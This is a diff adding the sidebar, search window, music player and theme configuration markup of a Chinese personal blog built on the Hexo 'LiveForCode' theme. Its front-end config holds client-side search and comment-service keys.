+    <div id="footer"></div>
+    <div id="sidebar">
+    <div class="menu-wrap" style="display:none;">
+        
+            <div class="menu-notice">
+                <span class="iconfont icon-notice"></span>
+                <div class="notice">
+                    <span>简单地活着，肆意而又精彩！</span>
+                </div>
+            </div>
+        
+        <nav class="menu">
+            <div class="menu-introduce"> 
+                <div class="introduce-avatar">
+                    <img src="/image/sidebar/touxiang.jpg">
+                </div> 
+                <div class="introduce-info"> 
+                    <div class="introduce-user"><span>章鱼海绵</span></div>
+                </div> 
+            </div> 
+            <div class="menu-list">
+                <ul>
+                    
+                        <li class=""><a href="/" class="" target="_self"><span class="iconfont icon-home-fill"></span>首页</a></li>
+                    
+                        <li class=""><a href="/category" class="" target="_self"><span class="iconfont icon-folder-fill"></span>分类</a></li>
+                    
+                        <li class=""><a href="/tag" class="" target="_self"><span class="iconfont icon-discount-fill"></span>标签</a></li>
+                    
+                        <li class=""><a href="/archive" class="" target="_self"><span class="iconfont icon-calendar-fill"></span>归档</a></li>
+                    
+                        <li class=""><a href="/donate" class="" target="_self"><span class="iconfont icon-heart-fill"></span>赞赏</a></li>
+                    
+                        <li class=""><a href="/about" class="" target="_self"><span class="iconfont icon-about-fill"></span>关于</a></li>
+                    
+                        <li class=""><a href="/atom.xml" class="" target="_blank"><span class="iconfont icon-rss"></span>订阅</a></li>
+                    
+                        <li class=""><a href="javascript:;" class="search" target="_self"><span class="iconfont icon-search-menu"></span>搜索</a></li>
+                    
+                        <li class=""><a href="/comment" class="" target="_self"><span class="iconfont icon-comments-fill"></span>留言板</a></li>
+                    
+                        <li class=""><a href="/friend" class="" target="_self"><span class="iconfont icon-link"></span>友情链接</a></li>
+                    
+                </ul> 
+            </div> 
+            <div class="menu-link">
+                <div class="box">
+                    <div class="image-box"></div>
+                </div>
+                
+                    <a name="知乎" href="https://www.4399.com/" class="" target="_blank" data=""><span class="iconfont icon-zhihu"></span></a>
+                
+                    <a name="微博" href="https://www.4399.com/" class="" target="_blank" data=""><span class="iconfont icon-weibo"></span></a>
+                
+                    <a name="QQ" href="javascript:;" class="image" target="_self" data="/image/sidebar/qq.png"><span class="iconfont icon-qq"></span></a>
+                
+                    <a name="微信" href="javascript:;" class="" target="_self" data="/image/sidebar/weixin.png"><span class="iconfont icon-wechat"></span></a>
+                
+                    <a name="GitHub" href="https://github.com/zhangyuhaimian/zhangyuhaimian.github.io" class="" target="_blank" data=""><span class="iconfont icon-github"></span></a>
+                
+            </div> 
+        </nav>
+        <button class="menu-button-close"></button>
+        <div class="morph-shape" id="morph-shape" data-morph-open="M-7.312,0H15c0,0,66,113.339,66,399.5C81,664.006,15,800,15,800H-7.312V0z;M-7.312,0H100c0,0,0,113.839,0,400c0,264.506,0,400,0,400H-7.312V0z">
+            <svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 100 800" preserveAspectRatio="none">
+                <path d="M-7.312,0H0c0,0,0,113.839,0,400c0,264.506,0,400,0,400h-7.312V0z"/>
+            </svg>
+        </div>
+    </div>
+    <button class="menu-button-open">MENU</button>
+    <div class="menu-cover"></div>
+</div>
+    <link type="text/css" rel="stylesheet" href="/css/search.css">
+<script type="text/javascript" src="/js/iscroll.js"></script>
+<script type="text/javascript" src="/js/instantsearch.min.js"></script>
+<div class="search-window">
+    <div class="search-content">
+        <div class="search-content-icon">
+            <i class="iconfont icon-search"></i>
+        </div>
+        <div id="search-input" class="search-input"></div>
+    </div>
+
+    <div class="search-scroll">
+        <div class="search-result">
+            <div id="search-stats" class="search-stats"></div>
+            <div id="search-hits"></div>
+            <div id="search-pagination" class="search-pagination"></div>
+        </div>
+    </div>
+
+    <span class="search-close-icon">
+        <i class="iconfont icon-close"></i>
+    </span>
+</div>
+    <div id="tools">
+    <div class="progressbar-top"></div>
+
+    
+        <link type="text/css" rel="stylesheet" href="/css/APlayer.css">
+        <script type="text/javascript" src="/js/APlayer.min.js"></script>
+        <script type="text/javascript" src="/js/Meting.min.js"></script>
+        <meting-js id="3778678" lrcshow="false" server="netease" type="playlist" fixed="true" autoplay="false" loop="all" order="random" preload="auto" volume="0.67" mutex="true"></meting-js>
+    
+    
+    <div class="wrap-right">
+        <div class="setting">
+            <div class="iconbox favorites" switch="false">
+                <span class="iconfont icon-favorites"></span>
+                <span class="icontext">关注</span>
+            </div>
+            <div class="iconbox mode">
+                <div class="light">
+                    <span class="iconfont icon-daymode"></span>
+                    <span class="icontext">浅色模式</span>
+                </div>
+                <div class="dark">
+                    <span class="iconfont icon-nightmode-fill"></span>
+                    <span class="icontext">深色模式</span>
+                </div>
+            </div>
+            <a href="javascript:;" target="_self" class="search">
+                <div class="iconbox">
+                    <span class="iconfont icon-search-menu"></span>
+                    <span class="icontext">搜索</span>
+                </div>
+            </a>
+            <div class="iconbox bottom">
+                <div style="display: inline-block; transform: rotate(180deg);">
+                    <span class="iconfont icon-top"></span>
+                </div>
+                <span class="icontext">跳至底部</span>
+            </div>
+        </div>
+        <div class="iconbox set">
+            <div style="display: inline-block;">
+                <span class="iconfont icon-setting"></span>
+            </div>
+            <span class="icontext">设置</span>
+        </div>
+        <div class="iconbox top">
+            <span class="iconfont icon-top"></span>
+            <span class="icontext">返回顶部</span>
+        </div>
+    </div>
+    <div class="loading"></div>
+</div>
+    <script>
+    window.config = {
+        GitHubUserName     : "zhangyuhaimian",
+        GitHubRepositories : "zhangyuhaimian",
+
+        User             : "章鱼海绵",
+        UserAvatar       : "/image/sidebar/touxiang.jpg",
+        WebsiteStartDate : "2023-02-10",
+
+        WebsiteTitleBlur         : "(◍´꒳`◍) Hi, Live For Code",
+        WebsiteTitleBlurTimeOut  : 500,
+        WebsiteTitleFocus        : "(*´∇｀*) 欢迎回来!",
+        WebsiteTitleFocusTimeOut : 1000,
+        WebsiteFavicon           : "/image/website/logo.png",
+
+        ProgressBar : {
+            id       : "topProgressBar",
+            color    : "#77B6FF",
+            height   : "2px",
+            duration : 0.2
+        },
+
+        Loading: {
+            rebound : {
+                tension  : 16,
+                friction : 5
+            },
+            spinner : {
+                id     : "spinner",
+                radius : 90,
+                sides  : 3,
+                depth  : 4,
+                colors : {
+                    background : "#F0F0F0",
+                    stroke     : "#272633",
+                    base       : "",
+                    child      : "#272633"
+                },
+                alwaysForward : true,
+                restAt        : 0.5,
+                renderBase    : false
+            }
+        },
+
+        HomeHeaderAnimationRendered : true,
+        HomeHeaderAnimation         : {
+            radius      : 15,
+            density     : 0.2,
+            color       : "rgba(255, 255, 255, .2)",
+            clearOffset : 0.3
+        },
+
+        BackAnimationRendered          : true,
+        IEBrowserBackAnimationRendered : false,
+        BackAnimation                  : {
+            colorSaturation  : "60%",
+            colorBrightness  : "50%",
+            colorAlpha       : 0.5,
+            colorCycleSpeed  : 5,
+            verticalPosition : "random",
+            horizontalSpeed  : 200,
+            ribbonCount      : 3,
+            strokeSize       : 0,
+            parallaxAmount   : -0.2,
+            animateSections  : true
+        },
+
+        HomeHeaderImage : [
+            
+                "/image/header/home.jpg",
+            
+                "/image/header/back.jpeg",
+            
+        ],
+        HomeBannerText  : "",
+
+        ArticleHeaderImage : [
+            
+                "/image/header/article.jpg",
+            
+        ],
+
+        OtherBannerText : "",
+
+        Error : {
+            icon    : "icon-swimming",
+            title   : "PAGE NOT FOUND",
+            content : [
+                
+                    "很抱歉，您访问的页面不存在！",
+                
+                    "可能是输入地址有误或该地址已变更。",
+                
+            ],
+            buttons : [
+                
+                    {
+                        icon  : "icon-home",
+                        text  : "返回首页",
+                        href  : "/",
+                        class : ""
+                    },
+                
+            ]
+        },
+
+        MenuNotice : {
+            enable : true,
+            notice : "简单地活着，肆意而又精彩！",
+            speed  : 20
+        },
+        MenuList : [
+            
+                {
+                    name   : "首页",
+                    icon   : "icon-home-fill",
+                    href   : "/",
+                    type   : "index",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "分类",
+                    icon   : "icon-folder-fill",
+                    href   : "/category",
+                    type   : "category",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "标签",
+                    icon   : "icon-discount-fill",
+                    href   : "/tag",
+                    type   : "tag",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "归档",
+                    icon   : "icon-calendar-fill",
+                    href   : "/archive",
+                    type   : "archive",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "赞赏",
+                    icon   : "icon-heart-fill",
+                    href   : "/donate",
+                    type   : "donate",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "关于",
+                    icon   : "icon-about-fill",
+                    href   : "/about",
+                    type   : "about",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "订阅",
+                    icon   : "icon-rss",
+                    href   : "/atom.xml",
+                    type   : "",
+                    class  : "",
+                    target : "_blank"
+                },
+            
+                {
+                    name   : "搜索",
+                    icon   : "icon-search-menu",
+                    href   : "javascript:;",
+                    type   : "",
+                    class  : "search",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "留言板",
+                    icon   : "icon-comments-fill",
+                    href   : "/comment",
+                    type   : "comment",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "友情链接",
+                    icon   : "icon-link",
+                    href   : "/friend",
+                    type   : "friend",
+                    class  : "",
+                    target : "_self"
+                },
+            
+        ],
+        MenuLink : [
+            
+                
+                    {
+                        name   : "知乎",
+                        icon   : "icon-zhihu",
+                        href   : "https://www.4399.com/",
+                        class  : "",
+                        target : "_blank",
+                        image  : ""
+                    },
+                
+                    {
+                        name   : "微博",
+                        icon   : "icon-weibo",
+                        href   : "https://www.4399.com/",
+                        class  : "",
+                        target : "_blank",
+                        image  : ""
+                    },
+                
+                    {
+                        name   : "QQ",
+                        icon   : "icon-qq",
+                        href   : "javascript:;",
+                        class  : "image",
+                        target : "_self",
+                        image  : "/image/sidebar/qq.png"
+                    },
+                
+                    {
+                        name   : "微信",
+                        icon   : "icon-wechat",
+                        href   : "javascript:;",
+                        class  : "",
+                        target : "_self",
+                        image  : "/image/sidebar/weixin.png"
+                    },
+                
+                    {
+                        name   : "GitHub",
+                        icon   : "icon-github",
+                        href   : "https://github.com/zhangyuhaimian/zhangyuhaimian.github.io",
+                        class  : "",
+                        target : "_blank",
+                        image  : ""
+                    },
+                
+            
+        ],
+
+        FooterStyle : 2,
+        BottomText  : "<div><span class='face'>ღゝ◡╹)ノ♡</span></div><div>【人生若只如初见<span><i class='iconfont icon-like-fill'></i></span>何事秋风悲画扇】</div><div>&copy; 2020-2022 WorstOne. All Rights Reserved.</div>",
+
+        ConsoleList : [
+            
+                
+                    [
+                        
+                            
+                                "Based on cnblogs theme SimpleMemory.",
+                            
+                                "",
+                            
+                        
+                    ],
+                
+                    [
+                        
+                            
+                                "SimpleMemory Author:",
+                            
+                                "BNDong",
+                            
+                        
+                    ],
+                
+                    [
+                        
+                            
+                                "Theme:",
+                            
+                                "LiveForCode",
+                            
+                        
+                    ],
+                
+            
+        ],
+
+        FontIconExtend : "",
+
+        Donate : {
+            paypal  : "",
+            bitcoin : "",
+            alipay  : "/image/donate/wechat.png",
+            wechat  : "/image/donate/wechat.png"
+        },
+
+        Search : {
+            applicationID : "010C3EANT8",
+            apiKey        : "c7abab9f11b79102b9aff7fe6d41447d",
+            indexName     : "Notes",
+            hits          : {
+                page : 10
+            },
+            labels        : {
+                placeholder : "搜索",
+                empty       : "未发现与 「${query}」 相关的内容",
+                stats       : "${hits} 条相关条目，使用了 ${time} 毫秒",
+            }
+        }, 
+
+        Valine : {
+            switch         : true,
+            el             : ".comments-content",
+            appId          : "srhKtvWPQTWYKh3qX8G8M7v0-gzGzoHsz",
+            appKey         : "8uVSP1q6UlALVC5igYfIfv2h",
+            serverURLs     : "",
+            placeholder    : "你是我一生只会遇见一次的惊喜...",
+            avatar         : "mm",
+            meta           : "nick,mail,link",
+            requiredFields : "nick,mail",
+            pageSize       : 5,
+            lang           : "zh-cn",
+            visitor        : true,
+            enableQQ       : true
+        },
+
+        Tocbot : {
+            switch                : true,
+            tocSelector           : ".toc",
+            contentSelector       : ".article-body",
+            headingSelector       : "h1, h2, h3, h4, h5",
+            headingsOffset        : 0,
+            scrollSmooth          : true,
+            scrollSmoothOffset    : -5,
+            positionFixedSelector : ".toc",
+            positionFixedClass    : "toc-fixed",
+            fixedSidebarOffset    : "",
+        },
+
+        Require : {
+            baseUrl     : "/js/",
+            waitSeconds : 100
+        },
+
+        Music : {
+            type : "Meting"
+        },
+        APlayer : {
+            container : ".aplayer",
+            fixed     : true,
+            autoplay  : false,
+            loop      : "all",
+            order     : "random",
+            preload   : "auto",
+            volume    : 0.67,
+            mutex     : true,
+            lrcType   : 3,
+            audio     : [
+                
+                    {
+                        name   : "Endless Tears",
+                        artist : "CLIFF EDGE",
+                        cover  : "/music/cover/Endless Tears.jpg",
+                        url    : "/music/song/Endless Tears.mp3",
+                        lrc    : "/music/lrc/Endless Tears.lrc"
+                    },
+                
+            ]
+        },
+        Meting : {
+            id       : "3778678", 
+            lrcshow  : false, 
+            server   : "netease", 
+            type     : "playlist", 
+            fixed    : true, 
+            autoplay : false, 
+            loop     : "all", 
+            order    : "random", 
+            preload  : "auto", 
+            volume   : 0.67, 
+            mutex    : true
+        },
+
+        Mouse : {
+            enable  : true,
+            options : {
+                size  : 6,
+                sizeF : 24
+            }
+        },
+
+        LazyLoad : {
+            default : "/image/website/lazyload.svg"
+        },
+  
+        Style : {
+            aplayer          : "/css/APlayer.css",
+            archive          : "/css/archive.css",
+            base             : "/css/base.css",
+            clipboard        : "/css/clipboard.css",
+            code             : "/css/code.css",
+            donate           : "/css/donate.css",
+            fancybox         : "/css/jquery.fancybox.css",
+            footer           : "/css/footer.css",
+            iconfont         : "/iconfont/iconfont.css",
+            index            : "/css/index.css",
+            menuBubble       : "/css/menu-bubble.css",
+            mouse            : "/css/mouse.css",
+            page             : "/css/page.css",
+            post             : "/css/post.css",
+            search           : "/css/search.css",
+            tocbot           : "/css/tocbot.css",
+            valine           : "/css/valine.css"
+        },
+
+        Script: {
+            aplayer          : "/js/APlayer.min.js",
+            config           : "/js/require.config.js",
+            index            : "/js/index.js",
+            instantSearch    : "/js/instantsearch.min.js",
+            iscroll          : "/js/iscroll.js",
+            jQuery           : "/js/jquery-3.4.1.min.js",
+            loading          : "/js/loading.js",
+            meting           : "/js/Meting.min.js",
+            require          : "/js/require.min.js"
+        },
+
+        Font: {
+            LongCang    : "/font/LongCang.css",
+            Monda       : "/font/Monda.css",
+            NotoSansSC  : "/font/NotoSansSC.css",
+            NotoSerifSC : "/font/NotoSerifSC.css",
+            Playball    : "/font/Playball.css",
+            PTMono      : "/font/PTMono.css",
+            Roboto      : "/font/Roboto.css",
+            RobotoSlab  : "/font/RobotoSlab.css",
+            Rosario     : "/font/Rosario.css",
+            UbuntuMono  : "/font/UbuntuMono.css"
+        },
+
+        Suffix : {
+            about : "简单地活着, 肆意又精彩."
+        },
+            
+        Theme : {
+            url  : "https://github.com/first19326/Hexo-LiveForCode",
+            name : "Hexo - Live For Code"
+        }  
+    };
+</script>
+    <script type="text/javascript" src="/js/index.js"></script>
+</body>
+</html>
